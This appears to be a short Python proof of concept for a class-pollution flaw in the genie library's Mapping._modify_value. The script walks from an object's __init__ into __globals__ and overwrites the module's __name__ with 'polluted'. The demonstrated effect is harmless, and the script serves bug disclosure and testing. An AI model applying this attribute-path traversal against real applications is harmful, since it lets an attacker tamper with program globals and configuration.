from genie.libs.sdk.libs.utils.mapping import Mapping
from dataclasses import dataclass

@dataclass
class State:
  input: str
  output: str
  device: int
  textarea_key: int

obj = State('HELLO', 'WORLD', 0, 0)
mapping = Mapping()

mapping._modify_value(obj, ["__init__", "__globals__", "__name__"], 'polluted')
print(__name__) # polluted
